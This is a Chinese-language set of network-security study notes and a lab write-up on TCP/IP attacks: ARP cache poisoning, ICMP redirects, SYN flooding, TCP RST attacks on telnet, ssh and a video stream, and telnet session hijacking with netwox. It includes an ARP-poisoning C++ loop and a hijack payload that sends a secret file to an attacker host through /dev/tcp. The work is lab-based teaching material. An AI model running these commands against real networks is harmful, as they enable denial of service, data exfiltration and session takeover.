# TCP/IP Attack 

## 名词解释

1、名词解释：ARP cache poisoning，ICMP Redirect Attack，SYN Flooding Attack，TCP Session Hijacking。如果想监听局域网内另外一台机器，一般先要进行什么步骤？

#### ARP cache poisoning

参考文档：[arp-spoofing](https://www.imperva.com/learn/application-security/arp-spoofing/)

地址解析协议 (ARP) 是一种使网络通信能够到达网络上特定设备的协议。ARP 将 Internet 协议 (IP) 地址转换为媒体访问控制 (MAC) 地址，反之亦然。

 ARP 欺骗（ARP spoofing**, **ARP cache poisoning, or ARP poison routing）可能允许攻击者拦截网络上的数据帧、修改流量或停止所有流量。通常，攻击被用作其他攻击的开端，例如拒绝服务、中间人或会话劫持攻击。该攻击只能在使用 ARP 的网络上使用，并且需要攻击者可以直接访问要攻击的本地网段。

一台不可信赖的计算机会发出假冒的ARP查询或应答信息，并将所有流向它的数据流转移。这样，它就可以伪装成某台机器，或修改数据流。这种攻击叫做ARP欺骗攻击。

![img](TCPIPAttackLab/ARP_Spoofing.png)

ARP 欺骗是一种中间人(MitM)攻击，允许攻击者拦截网络设备之间的通信。攻击的工作原理如下：

1. 攻击者必须有权访问网络。他们扫描网络以确定至少两个设备的 IP 地址——假设它们是工作站和路由器。 
2. 攻击者使用欺骗工具（例如 Arpspoof 或 Driftnet）发送伪造的 ARP 响应。 
3. 伪造的响应会宣传属于路由器和工作站的两个 IP 地址的正确 MAC 地址是攻击者的 MAC 地址。这欺骗了路由器和工作站连接到攻击者的机器，而不是相互连接。
4. 这两个设备更新它们的 ARP 缓存条目，并从那时起与攻击者通信，而不是直接相互通信。
5. 攻击者现在秘密地处于所有通信的中间。

使用命令行检测特定设备的 ARP缓存是否已中毒的简单方法：以管理员身份启动终端，`arp -a`，如果该表包含两个具有相同 MAC 地址的不同 IP 地址，则表明正在发生 ARP 攻击。

#### ICMP Redirect Attack

参考文档：[what-icmp-redirect-message](https://www.ibm.com/support/pages/what-icmp-redirect-message)

ICMP 重定向是 IP 的一项“功能”，它允许路由器通知主机有一条更有效的到达目的地的路由，并且主机应该相应地调整其路由表。这在受信任的 LAN 上可能没问题，但在狂野的 Internet 上，随别人的心血来潮改变您的路由表可能不是一个好主意。可能被恶意用于将流量重定向到特定系统的攻击。如果黑客想让被攻击主机修改其路由表，黑客伪装成路由器，向主机发送 Internet 控制消息协议 (ICMP) 重定向消息，让主机根据黑客的要求修改路由表，所有未来的流量都必须定向到特定系统。

![](TCPIPAttackLab/960px-ICMPv4_redirect_message_example-en.svg-16461576257739.png)

#### SYN Flooding Attack

[syn-flood-ddos-attac](https://www.cloudflare.com/en-gb/learning/ddos/syn-flood-ddos-attack/)

[syn-flood](https://www.imperva.com/learn/ddos/syn-flood/)

SYN Flood Attack是一种拒绝服务 (DDoS) 攻击，旨在通过消耗所有可用的服务器资源使服务器对合法流量不可用。通过重复发送初始连接请求 (SYN) 数据包，攻击者能够淹没目标服务器计算机上的所有可用端口，导致目标设备对合法流量的响应缓慢或根本不响应。

SYN Flood攻击：攻击者利用TCP连接的半开放状态发动攻击。攻击者使用第一个数据包对服务器进行大流量冲击，使服务器一直处于半开放连接状态，从而无法完成3步握手协议。

TCP SYN 洪水（又名 SYN 洪水）是一种 分布式拒绝服务 ( DDoS ) 攻击，它利用正常 TCP 三向握手的一部分 来消耗目标服务器上的资源并使其无响应。本质上，使用 SYN flood DDoS，攻击者发送 TCP 连接请求的速度比目标机器处理它们的速度更快，从而导致网络饱和。

在 SYN 泛洪攻击中，攻击者经常使用虚假 IP 地址向目标服务器上的每个端口发送重复的 SYN 数据包。服务器在没有意识到攻击的情况下，接收到多个明显合法的建立通信请求。它使用来自每个开放端口的 SYN-ACK 数据包来响应每次尝试。

恶意客户端要么不发送预期的 ACK，要么（如果 IP 地址被欺骗）从一开始就不会收到 SYN-ACK。无论哪种方式，受到攻击的服务器都将等待对其 SYN-ACK 数据包的确认一段时间。

攻击者利用这样一个事实，即在接收到初始 SYN 数据包后，服务器将返回一个或多个 SYN/ACK 数据包并等待握手的最后一步。

![SYN flood DDoS攻击动画](TCPIPAttackLab/syn-flood-attack-ddos-attack-diagram-2.png)

![第2讲-低层协议的安全性_01](TCPIPAttackLab/第2讲-低层协议的安全性_01.jpg) 


| 正常的TCP “三次握手”                                   | TCP SYN Flood                                                |
| ------------------------------------------------------ | ------------------------------------------------------------ |
| 客户端通过向服务器发送 SYN（同步）消息来请求连接。     | 攻击者向目标服务器发送大量 SYN 数据包，通常带有欺骗性IP 地址。 |
| 服务器通过向客户端发送 SYN-ACK（同步确认）消息来确认。 | 服务器响应每个连接请求，并留下一个开放端口准备接收响应。     |
| 客户端以 ACK（确认）消息进行响应，并建立连接。         | 在服务器等待最终的 ACK 数据包（它永远不会到达）时，攻击者会继续发送更多的 SYN 数据包。<br/>每一个新的 SYN 包的到来，都会导致服务器暂时保持一个新的开放端口连接一段时间，一旦所有可用的端口都被利用完，服务器就无法正常工作。 |

#### TCP Session Hijacking

[network-or-tcp-session-hijacking](https://www.greycampus.com/opencampus/ethical-hacking/network-or-tcp-session-hijacking)

TCP 会话劫持是对受保护网络上的用户会话的安全攻击，因为身份验证通常只在 TCP 会话开始时进行，所以有可乘之机。

最常见的会话劫持方法称为 **IP 欺骗：**攻击者使用源路由 IP 数据包将命令插入网络上两个节点之间的活动通信中，并将自己伪装成经过身份验证的用户之一。将消息发送到具有表明该消息来自受信任主机的 IP 地址的计算机。

另一种是**中间人攻击：**攻击者试图通过 ARP 欺骗和中间人攻击来获取会话 ID，使用嗅探器可以观察设备之间的通信并收集传输的数据。

![illustration-of-session-hijacking-using-packet-sniffing](TCPIPAttackLab/illustration-of-session-hijacking-using-packet-sniffing.png)



还有一种**盲目劫持：**在禁用源路由的情况下，会话劫持者还可以使用盲劫持，将恶意数据注入 TCP 会话中截获的通信中。之所以称为盲，是因为他看不到反应；虽然劫持者可以发送数据或命令，但他基本上是在猜测客户端和服务器的响应。

TCP 会话劫持者的目标是创建客户端和服务器无法交换数据的状态；使他/她能够为两端伪造可接受的数据包，模仿真实的数据包。因此，攻击者能够控制会话。

#### 监听域外步骤

如果想监听局域网内另外一台机器，一般先要进行什么步骤？

发送ARP欺骗包伪装网关，将`网内的机器网关的IP+你的MAC地址`伪装成真网关，这样就会将数据发送到本机

## Netwox/Netwag

2、阅读下面这篇文章并且了解Netwox/Netwag的基本操作：
Netwox/Netwag Troubleshooting guide 
http://www.cis.syr.edu/~wedu/seed/Documentation/Misc/netwox.pdf

[PDF: netwox](netwox.pdf)

[netwox-doc](https://web.ecs.syr.edu/~wedu/Teaching/cis758/netw522/netwox-doc_html/html/examples.html)、[netwox](http://www.vulnerabilityassessment.co.uk/netwox.htm)

### 通用工具

##### Tool 7 : sniff packets and display them

这个工具显示网络数据包。您必须选择要拦截数据包的设备。

1. 找到你正在使用的嗅探设备。

2. 通过提供pcap过滤器来细化它。

```bash
# netwox 7
 ETH_____________________________________________________________________.
 | 00:01:01:01:01:01 vers 00:02:02:02:02:02         type : 0x0800        |
 |_______________________________________________________________________|
 IP______________________________________________________________________.
 |version |  ihl   |       tos       |              totlen               |
 |___ 4___|___ 5___|_______  0_______|____________0054h=   84____________|
 |                id                 |xxDfMf         fragoffset          |
 |____________061Dh= 1565____________|0_0_0__________0000h=    0_________|
 |       ttl       |    protocol     |          header checksum          |
 |_____40h= 64_____|_____01h=  1_____|_______________DF38h_______________|
 |                                source                                 |
 |______________________________192.168.1.1______________________________|
 |                              destination                              |
 |______________________________192.168.1.2______________________________|
 ICMP_(echo request)_____________________________________________________.
 |      type       |      code       |             checksum              |
 |_____08h=  8_____|_____00h=  0_____|____________2829h=10281____________|
 65 01 01 00  91 04 40 3C  AC 91 01 00  08 09 0A 0B     # e.....@<........
[...]

```

##### Tool38:Spoof Ip4 packet

这个工具是用来欺骗IP数据包的。

在使用这个工具时可能遇到主机操作系统会放弃该数据包的问题，这是因为一些操作系统（如Linux）会验证源的IP地址是否在其ARP缓存中。可以先将ARP缓存中的数据删除。这个工具一般有效

可以用来发送假的IP数据包，它让用户完全控制IP头。对IP头的控制。理论上说，它本身是自足的，可以进行所有其他的TCP/ICMP攻击，只要能精确地提供正确的其有效载荷的值，这可能会变得有点混乱。因此，我们将使用这个工具纯粹用于IP攻击，如DoS、Tear Drop等。

##### Tool41:Spoof Ip4Icmp4 packet

41: 这个工具被用来欺骗IP/ICMP数据包。它允许攻击者用任意的IP参数发送任意长度的ICMP数据包。几乎所有与ICMP有关的攻击都可以用这个工具完成。这个工具是基于Tool 38的。它允许用户将ICMP头参数与IP头参数一起指定。尽管对大多数特定的ICMP攻击有专门的工具，如Source Quench, ICMP redirect等（见下一节），这个工具也可以用于这些攻击。
此工具对于Ping Of Death和smurf攻击非常有用，其他工具无法执行这些攻击。

##### Tool40:Spoof Ip4Tcp packet

40：它用于欺骗TCP/IP数据包。通过正确的参数设置，所有的TCP攻击都可以用这个工具完成。它允许用户修改数据包的IP头、TCP头和TCP数据。
这被用于会话劫持，可以很容易地用于编写操作系统指纹扫描器。

### 特殊工具

##### 80:Periodically send ARP replies

80:该工具发送连续的ARP响应。您需要设备名称

(上面解释过)，以及源和目的IP地址以及以太网地址。即使你不知道任何机器的以太网地址，你可以提供@IP作为参数，Netwox会为你解决它(例如，ip地址为1.2.3.4的机器的以太网地址是@1.2.3.4)

##### 72:Scan ARP (EthIp spoof)

72:一些系统拒绝ARP响应，如果他们没有请求它。这时这个工具就派上用场了。它使用欺骗地址向目标机器发送一个ARP请求(可以用于ARP缓存中毒)。

这个工具的唯一问题是它不发送连续的数据包。

这个问题可以通过在脚本中使用它来克服，这将在下一节中进行演示。

##### 82、83、84、85、86

> 82:Sniff and send ICMP4/ICMP6 destination unreachable
> 嗅探并发送ICMP4/ICMP6目的地不可达的信息
>
> 83:Sniff and send ICMP4/ICMP6 time exceeded
> 嗅探和发送ICMP4/ICMP6的时间超过了
>
> 84:Sniff and send ICMP4/ICMP6 parameter problem
> 嗅探并发送ICMP4/ICMP6参数问题
>
> 85:Sniff and send ICMP4 source quench
> 嗅探并发送ICMP4信号源熄灭
>
> 86:Sniff and send ICMP4/ICMP6 redirect
> 嗅探并发送ICMP4/ICMP6重定向

82、83、84、85、86:这些工具用于专门的ICMP攻击和使用起来很简单。请查看Netwag对这些工具的解释。

##### 76,78

> 76:Synflood
> 同步泛洪 迅雷不及掩耳之势
>
> 78:Reset every TCP packe
> 重置每个TCP数据包

76,78:这些工具用于特定的TCP攻击(SYN和RST攻击)，并且非常简单。

### 命令行

虽然Netwag GUI真的很简单，但像其他GUI一样，它可能会变得 有一点限制。例如，它不允许我们连续使用72号工具。手动点击 100次并不是很有效。Netwag GUI只是一个封装器 围绕着Netwox，所以我们可以直接从命令行中使用Netwox，而不是使用Netwag。使用Netwox，而是直接从命令行中使用Netwox。要记住所有的 我们要使用的所有工具的选项，所以我们可以使用GUI来生成 命令给我们。请看下面的屏幕截图。

![image-20220302173551775](TCPIPAttackLab/image-20220302173551775.png)

输入参数后，单击Generate按钮，而不是单击run按钮。这将在窗口的底部显示一些文本。复制该文本并将其用作Netwox命令的参数。例如，对于前面提到的情况，输出将是:

```bash
#netwox 7 --device "Eth2" --filter "host 1.2.3.4 and tcp port 80" --rawip
```

现在我们知道了如何从命令行使用netwox工具，我们可以围绕它编写大量的功能代码。大多数现代语言如C、C++、Java、Perl、Ruby等都允许你执行随机文件。我们可以利用这些语言所提供的字符串操作能力和netwox工具来设计任意的自动攻击。考虑一下下面的程序。

```c++
#include <iostream>
using namespace std;
int main()
{
	char add[50];
	char ethadd[50];
	char arppoison[1000];
	for(int i=1;i<255;i++)
	{
	sprintf(add,"192.168.232.%d",i);
	sprintf(ethadd,"%x:%x:%x:%x:%x:%x",i,i,i,i,i,i);
	sprintf(arppoison,"netwox --ips \"192.168.232.131\"	--device \"Eth2\" --src-eth %s --src-ip %s",ethadd,add);
	system(arppoison);
	}
}
```

上面的代码试图在ARP缓存中投毒，该机器的IP地址为 IP地址为192.168.232.131的机器上的255个假值。由于以太网地址 是十六进制的，第20行构建了一个假的十六进制字符串，作为 以太网地址。这个程序将为IP地址192.168.232.1到192.168.232.255添加条目 到192.168.232.255在192.168.232.131的arp缓存中。
使用类似的策略可以设计出更复杂的攻击。

## linux命令

```bash
sysctl -q net.ipv4.tcp_max_syn_backlog
sysctl -w net.ipv4.tcp_syncookies=0
```

> `sysctl`  用于在内核运行时动态地修改内核的运行参数；
>
> > `-p`：从配置文件“/etc/sysctl.conf”加载内核参数设置；
> >
> > `-w`：当改变sysctl设置时使用此项；

- `net.ipv4.tcp_max_syn_backlog`：TCP syn 队列的最大长度, 是指定所能接受SYN同步包的最大客户端数量，即半连接上限；第一次握手的连接参数过大可能也会遭受syn flood攻击

- `net.ipv4.tcp_syncookies `：为1表示开启SYN cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭

## Smashing C++ VPTRs

4、阅读Smashing C++ VPTRs这篇文章，阐述其原理。
http://www.phrack.org/issues.html?issue=56&id=8

[Phrack Magazine](phrack.org- Phrack Magazine .pdf)

#### 介绍

目前，一套广为人知的技术指导我们如何利用通常用C语言编写的程序中的缓冲区溢出。虽然C语言几乎无处不在，但我们看到许多程序也是用C++编写的。在大多数情况下，适用于C语言的技术在C++中也是可用的，然而，C++在缓冲区溢出方面可以为我们提供新的可能性，这主要是由于面向对象技术的使用。我们将使用C++ GNU编译器，在x86 Linux系统上分析其中的一种可能性。



# Lab

## 任务1：SYN洪泛攻击

本任务(任务1、2)作者博客: https://blog.csdn.net/lanpesk

在客户端与服务器建立TCP时，首先要进入一个SYN与应答的阶段。这里是我们经常说的三次握手建立连接。具体的内容请自行了解，这里不再赘述。还是赘述一下吧。

> 在TCP中，客户端和服务端通信之前需要先建立一一个TCP连接。服务瑞首先需要进入监听状态以准备接收连接请求(通过调用listen()函数)，而客户端则需要发出连接请求来启动握手协议。
>
> 握手协议由三部分组成，如图所示。首先，客户端发送一个叫作SYN的特殊包给服务端，它使用一个随机产生的数字x作为初始序列号。因为TCP头部的SYN位被置为1,因此这个包叫作SYN包。其次，服务端收到SYN包后会回复一个 SYN + ACK 包(SYN和ACK位都被置为1)。服务端选择它自己随机生成的数字y作为初始序列号。再次，客户端收到这个包后再发出一个ACK包以结束这次握手。
>
> 当服务端收到初始SYN包（图a中标记为②的地方）时，它使用一个叫作传输控制块(TCB)的特殊数据结构来存储连接的信息。到这一步，连接还没有完全建立，因此称为半打开连接，即只有客户端到服务端方向的连接被确认，而服务端到客户端方向的连接还没有初始化。服务端将TCB存储在一个只用于存放半打开连接的队列中。在服务端从客户端得到ACK包后，它会将TCB拿出队列。
>
> 如果最后的ACK包没有到达，服务端会重新发送SYN+ACK包。如果最后的ACK包一直收不到，存储在半打开连接队列中的TCB最终会因超时而被丢弃。

![SYNFlooding](TCPIPAttackLab/SYNFlooding.png)

> 图b描述了SYN泛洪攻击的整个过程。
>
> 在拒绝服务dos攻击中。如果一个攻击者想要搞垮一个强大的服务器，它需要寻找服务器的弱点，并集中力量攻击这个弱点。半开放队列便是这样一个弱点。
>
> 在三次握手连接完成之前，服务器将所有半打开连接存储在一个队列中。这个队列的容量是有限的。如果攻击者可以快速填满这个队列，那么服务器将没有空间来存储任何半打开连接的TCB,它将不会再接受任何新的SYN包，即使它的CPU和宽带还没有达到上限，结果就是任何人都无法连接服务器。
>
> 要填满半打开连接的队列，攻击者只需要做以下事情:
>
> > ①连续发送SYN包给服务器;
> > ②不要完成三次握手协议的第三步，因为每一个 SYN包都会使一个 TCB被插入队列中，所以这一步会消耗掉队列的空间。
>
> 一旦记录已经存在于队列中，则希望它存在的时间尽可能得长。以下几种事件会导致TCB记录被移出队列:
>
> >  第一，如果客户端完成了三次握手协议，则记录将会被移出队列，因为它不再是半打开连接了;
> >
> > 第二，如果一个记录在队列中超时，它将会被从队列中删除，超时的时间段可能会比较长(例如40s);
> >
> > 第三，如果服务器收到了一个针对半打开连接的RST包，相应的TCB也会被移出队列。
>
> 当使用SYN泛洪攻击服务器时，攻击者需要使用随机的源IP地址，否则攻击很容易被防火墙屏蔽。当服务器回复SYN+ACK包时，回复可能会在网络的某个地方被丢弃，因为伪造的IP地址可能没有分配给任何计算机或者计算机此时没有上线。因此，半打开连接将会在队列中停留直到超时。如果一一个 SYN+ACK包到达了一个真实的计算机，该计算机将会发送一个TCP RST包给服务器，导致服务器将TCB记录移出队列。实践中会看到很多RST包。攻击必须和这些RST包竞争，如果慢了，就无法填满半打开连接的队列。

当服务器收到客户端发来的SYN连接请求时，会回复一个应答报文给客户端，此时服务器会将此连接放入半连接队列中，等待来自客户端的应答。这个半连接队列并不是无限长的，而是有限的。在我们的ubuntu虚拟机中，可以使用如下来命令查看对应的队列最大长度。

```bash
systcl -q net.ipv4.tcp_max_syn_backlog
```

![image-20220308220756693](TCPIPAttackLab/image-20220308220756693.png)

这里可以看到我们的最大队列长度时512，也就是我们的最多可以保存512个半连接，如果队列满了，那么新来的连接请求将不会被响应，其他用户的正常请求将不会被返回。

使用`netstat -tno`可以来查看当前系统的活跃的连接。

```bash
netstat -tno
```

![image-20220308222043314](TCPIPAttackLab/image-20220308222043314.png)

当前我们没有处在半连接状态的连接，半连接的State为SYN_Recv。

为了发起SYN洪泛攻击，我们需要能够发送伪造TCP数据包的程序或工具。我们可以自己使用rowsocket编写也可以使用现成的网络工具，这里我们使用netwox来进行我们的攻击操作。

攻击需要另一台主机来进行，这里我开启了一个虚拟机来作为主机。使用的时kali系统，也是linux的一种。

如果没有安装netwox，可以直接在控制台使用apt安装。

![image-20220308232210034](TCPIPAttackLab/image-20220308232210034.png)

在netwox中查找和syn相关的工具，可以看到76号工具就是我们的SYN洪泛工具。

首先我们查找虚拟机对应的ip地址。

在控制台中输入`ifconfig`

![image-20220308232523042](TCPIPAttackLab/image-20220308232523042.png)

被攻击机的eth0是我们的默认网卡，其ip地址为192.168.202.134。

```bash
ifconfig -a
```

![image-20220308232628984](TCPIPAttackLab/image-20220308232628984.png)

攻击机的ip地址为192.168.202.128。

|   分工   | 机器名称 |       IP        |
| :------: | :------: | :-------------: |
|  被攻击  |   seed   | 192.168.202.134 |
| Attacker |   Kali   | 192.168.202.128 |
|   游客   |   seed   |    not need     |



首先观察连接是否可达，使用`ping`命令。

```
ping 被攻击IP
```

![image-20220308232751377](TCPIPAttackLab/image-20220308232751377.png)

连接是通畅的。接下来我们发起SYN洪泛攻击。攻击虚拟机的telnet程序，这个程序使用的是23端口。

```bash
sudo netwox 76 -i 被攻击IP -p 端口 -s raw
```

![image-20220308232937654](TCPIPAttackLab/image-20220308232937654.png)

注意这里的工具启动需要sudo操作。

这样我们的攻击就已经发起，回到另一台虚拟中查看。

![image-20220308233039797](TCPIPAttackLab/image-20220308233039797.png)

可以看到这里多了很多的SYN_RECV状态的连接，就是我们的半连接。我们来尝试连接此服务器的telnet服务。由于这个服务收到syn洪泛攻击，应该不能正常服务。

![image-20220308233226496](TCPIPAttackLab/image-20220308233226496.png)

可惜的是，我们依旧能够使用telnet服务。

这是由于操作系统自身是有保护措施的。在ubuntu12.04中有一种保护措施SYNcookies是默认开启的。他会过滤掉不正常的SYN请求包，从而使服务可以正常运作。它的原理是，在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCP ACK包时，TCP服务器再根据那个cookie值检查这个TCP ACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。

这里在虚拟机中关闭SYNcookies。使用如下命令来关闭。

```bash
sysctl -w net.ipv4.tcp_syncookies=0
```

![image-20220308233536427](TCPIPAttackLab/image-20220308233536427.png)

再次发动攻击，并等待一段时间，或者调整虚拟机的synbacklog的长度。

```bash
telnet 被攻击IP
```

![image-20220308234051728](TCPIPAttackLab/image-20220308234051728.png)

可以看到，这次我们的telnet服务无法再正常工作了。

![image-20220308234154999](TCPIPAttackLab/image-20220308234154999.png)

关闭攻击后，服务又可用了。

## 任务2：对telnet与shh的RST复位攻击



在TCP连接要断开的时候，服务器端或者客户端会发送一个FIN包给对方(取决于谁发起断开)，之后TCP进入断开流程，也就是我们的四次挥手。注意到，只要收到了FIN就会进入断开流程，但是后续的数据接着到来，没有得到正确的断开响应，TCP连接还会继续。

但是RST包却没那么多事，复位请求可以直接破坏一个建立连接的TCP连接。所以我们可以通过发送伪造的RST包，来断开TCP连接。

![TCPResetAttack](TCPIPAttackLab/TCPResetAttack.png)

这里依旧是使用两台虚拟机。一个作为被攻击机，一个作为攻击机。

两机的IP地址在上方实验都以展示。

TCP连接有着很强的顺序性，这是协议本身为了满足数据的可靠与顺序到达造成的。也就是说，我们发送的包，在字节序上，要严格遵守当前的TCP连接。否则会被当做无效包被丢弃，我们的攻击也就无法成功。

一个TCP包重要的有两部分，一个是端口号，端口号可以代表通信的程序。一个是字节序，表示下一个期望的字节序，这是保证数据准确的，可被接收的重要要求。

这里先对telnet进行攻击。是的

我们需要用到wireshark这个网络嗅探工具。

![image-20220308235359103](TCPIPAttackLab/image-20220308235359103.png)

打开我们的wireshark，在过滤器中填入telnet，点击左上角的鲨鱼鳍，开始对网络进行监听

由于存在DNS解析等一系列的混杂数据，这里我将也过滤。

监听开始后，使用telnet建立连接。

![image-20220308235706458](TCPIPAttackLab/image-20220308235706458.png)

> 攻击是否成功依赖于序列号。放入伪造包中的序列号应该是接收方等待的号码，如果序列号太小，攻击将不成功。如果序列号太大，根据RFC793。只要在接收方窗口大小内就是合法的，当使用较大的序列号时，对连接没有影响，需要用准确的序列号才能成功。

可以看到这里就抓取到了我们与另一台虚拟机建立telnet连接的数据包。

选择最后一个包，打开其中的tcp内容。

![image-20220308235822989](TCPIPAttackLab/image-20220308235822989.png)

这里面可以看到下一个字节序，这里你的数据可能是比较小的，是相对字节序。

右键的`protocol preference`中可以取消相对字节序。

注意这里的数据包时对方到我们的，所以这个下一字节序，是期望我们发送的下一字节开始是从这个字节序开始。

所以，我们构建rowsocket，在tcp头中，写入这个字节序，再设置RST位，设置号源IP，源端口，目的IP，目的端口，就可以发送，来进行我们的攻击。

这里我们使用更简单的方法，采用netwox进行攻击。

![image-20220309000403958](TCPIPAttackLab/image-20220309000403958.png)

可以看到，78号工具正是我们需要的。

NetWox工具78的使用：

```bash
Title: Reset every TCP packets
Usage: netwox 78 [-d device] [-f filter] [-s spoofip] [-i ips]
Parameters:
    -d|--device device device name {Eth0}
    -f|--filter filter pcap filter
    -s|--spoofip spoofip IP spoof initialzation type
    {linkbraw}
    -i|--ips ips limit the list of IP addressed to
    reset {all}
```

这里我们直接使用他。

![image-20220309000650217](TCPIPAttackLab/image-20220309000650217.png)

当我们再操作telnet时，显示连接被强行终止。连接中断。

![image-20220309000733875](TCPIPAttackLab/image-20220309000733875.png)

> SSH的TCP连接是加密的。但他只加密TCP数据,而不加密TCP头，即这个加密是在网络层之上的传输层中进行的。因为TCP复位攻击只需要伪造TCP头部，不需要加载任何数据，因此TCP复位攻击可以成功。

使用ssh与虚拟机建立连接。

![image-20220309000843489](TCPIPAttackLab/image-20220309000843489.png)

再次启动攻击，观察ssh连接状态。

![image-20220309000924421](TCPIPAttackLab/image-20220309000924421.png)

可以看到，ssh连接被关闭。

## 任务 3：TCP RST 对视频流应用的攻击

> 让我们通过在当今广泛使用的应用程序上进行实验来使 TCP RST 攻击更有趣。 我们在这个任务中选择视频流应用程序。 对于这个任务，您可以选择您熟悉的视频流网站（bilibili）。 大多数视频共享网站与客户端建立 TCP 连接，用于对视频内容进行流媒体。 攻击者的目标是破坏被攻击者和视频流媒体之间建立的 TCP 会话。 假设攻击者和被攻击者在同一个局域网中。 在下面，我们描述了用户（被攻击者）与一些视频流媒体网站之间的常见交互： 
>
> - 被攻击者在视频流媒体网站上浏览视频内容，并选择其中一个视频进行流媒体。 .
>
> - 通常，视频内容由不同的机器托管，所有视频内容都位于其中。 在被攻击者选择视频后，将在被攻击者机器和内容服务器之间建立用于视频流的 TCP 会话。 然后，被攻击者可以查看其选择的视频。 

对于本部分，seed原装的火狐无法观看视频，甚至都难以安装其他浏览器。

您的任务是通过破坏被攻击者和内容服务器之间的 TCP 连接来破坏视频流。您可以让被攻击者用户从另一台（虚拟)机器或与攻击者相同的(虚拟）机器浏览视频流站点。 在这里我们使用seed虚拟机攻击Ubuntu20（The seed is too spicy chicken,can't install any software)，当seed开始攻击后，Ubuntu20的视频便连接不上服务器，视频流的TCP连接中断。


对于本次实验，使用如下命令都可以实现中断： 

```bash
sudo netwox 78 -i 192.168.190.135

sudo netwox 78 --filter 'dst host 192.168.190.135'
```

|   身份   |      机器      |       ip        |
| :------: | :------------: | :-------------: |
|   用户   |     ubuntu20     | 192.168.136.135 |
|服务器|bilibili服务器|not need|
| 攻击者 | kali(本色出演) |    not need     |
|  观察者  |      seed      |    not need     |

由**Kali**发出攻击指令(普普通通的seed也可以，只要有netwox均可发起攻击)

![image-20220309001139458](TCPIPAttackLab/image-20220309001139458.png)

发现**用户Ubuntu**视频播放中断

![image-20220309002024274](TCPIPAttackLab/image-20220309002024274.png)

在**观察者Seed上**我们打开Wireshark来抓包分析。

![image-20220309003656886](TCPIPAttackLab/image-20220309003656886.png)

WireShark黑色背景代表报文的各类错误，红色背景代表各类异常情景

![image-20220309002457480](TCPIPAttackLab/image-20220309002457480.png)

<kbd>Ctrl </kbd>+ <kbd>C</kbd>终止攻击之后，Ubuntu20的视频流便恢复正常

![image-20220309002213461](TCPIPAttackLab/image-20220309002213461.png)

然而，对于较新的视频，却可以不受干扰。可能是其在建立TCP连接后数据传输仅使用UDP的缘故。

![image-20220309001824581](TCPIPAttackLab/image-20220309001824581.png)

![image-20220309001904296](TCPIPAttackLab/image-20220309001904296.png)

但当我们尝试刷新时，便再无法通信了。因为其根本无法建立TCP通信

![image-20220309002639594](TCPIPAttackLab/image-20220309002639594.png)

以下NetWox命令为来自192.168.190.135的每个数据包发出RST数据包

```bash
sudo netwox 78 --filter "src host 192.168.190.135" 
```

直接破坏了TCP请求，也能让别人看不了视频

![image-20220309003313891](TCPIPAttackLab/image-20220309003313891.png)

![image-20220309002950772](TCPIPAttackLab/image-20220309002950772.png)

## 任务 4：TCP会话劫持

> TCP 会话劫持攻击的目的是通过向会话注入恶意内容来劫持两个受害者之间现有的 TCP 连接（会话）。 如果此连 接是 telnet 会话，攻击者可以注入恶意命令（例如：删除重要文件）到此会话中，导致受害者执行恶意命令。下图描述了攻击是如何工作的。 在此任务中，您需要演示如何在两台计算机之间劫持 telnet 会话。 您的目标是 让 telnet 服务器运行来自您的恶意命令。 为了任务的简单性，我们假设攻击者和受害者在同一个局域网中。
>
> 注意：如果使用 Wireshark 观察网络流量，您应该注意，当 Wireshark 显示 TCP 序列号时，默认情况下，它显示相对序列号，这等于实际序列号减去初始序列号。 如果要查看数据包中的实际序列号，则需要右键单击Wireshark 输出的 TCP 部分，然后选择“Protocol Preference”。 在弹出窗口中，取消选中`"Relative Sequence Number and Window Scaling"`“相对序列号和窗口缩放”选项。 

![TCP会话劫持](TCPIPAttackLab/TCP会话劫持.png)

![TCPSessionHijackingAttack](TCPIPAttackLab/TCPSessionHijackingAttack.png)

本次的分工如下：（kali被踢了）

关于机器的选择，可以提前在服务器上执行下条命令（攻击者已经开启natcat监听）：

```bash
cat /home/seed/secret > /dev/tcp/攻击者IP/9090 
```

如果失败了再检查设备，或者更换设备。

|   身份   |  机器  |       ip        |
| :------: | :----: | :-------------: |
|   User   | ubuntu | 192.168.136.132 |
|  Server  | seed2  | 192.168.136.136 |
| Attacker |  seed  | 192.168.136.130 |

在Seed上，Attacker嗅探数据

```bash
ip.addr==用户IP&&ip.addr==服务器IP
```

如果`telnet: Unable to connect to remote host: Connection refused`可以尝试重启openbsd-inetd(都是用seed应该没有问题，kali可能会出问题)

```bash
sudo /etc/init.d/openbsd-inetd restart
```

User向Server发起连接请求，并成功

```bash
sudo telnet 服务器IP
```

![image-20220309083318059](TCPIPAttackLab/image-20220309083318059.png)

制作**Seed2**服务器中的秘密信息，创建方式多种多样，成功即可。

```bash
touch secret

cat secret
```

![image-20220309085201834](TCPIPAttackLab/image-20220309085201834.png)

转义攻击命令内容，此命令可以将seed2服务器中的secret内容输出到/dev/tcp/192.168.191.132/9090的文件中，但这是个虚拟文件，会重定向到攻击者虚拟机。

为此，我们在攻击机seed上创建监听端口。

```bash
nc -lv 9090
```

![image-20220309085432194](TCPIPAttackLab/image-20220309085432194.png)

```python
python
# python2 seed
'\r cat /home/seed/secret > /dev/tcp/攻击者IP/9090 \r'.encode('hex')

# python3 ubuntu
'\r cat /home/seed/secret > /dev/tcp/攻击者IP/9090 \r'.encode("utf-8").hex()
```

![image-20220309084157026](TCPIPAttackLab/image-20220309084157026.png)

```bash
'0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f3139322e3136382e3133362e3133302f39303930200d'
```

观察最后一个TCP包，像这种显然不是正确的，序列号（seq,ack）太小了，不是绝对序列号。

> 有时很难使用正确的序列号。尤其是当受害者依然在客户端进行输入时。这时可以做一个估计。例如，如果当前可以看到一个序列号 N，则可以在攻击时使用 N+100。只要这个序列号在服务器接收窗口的允许范围内。伪造数据就会被放在接收方缓冲区。受害者在客户端进行输入时，缺失的数据很快会被填充。攻击命令也会被执行。需要在伪造数据的开头放一个换行符（\r）否则攻击命令会和受害者输入的字符串联改变命令的含义。
>
> 实验中可以故意使用一个略大的一些的序列号，再发送一个数攻击包后服务器并不会马上得到机密内容，其要等待用户继续输入一些新的字符。直到达到攻击包使用的序列号，此时程序会立即收到机密内容，表明攻击成功，只要用户依然在使用telnet程序。攻击就可以成功。

![image-20220309010949250](TCPIPAttackLab/image-20220309010949250.png)

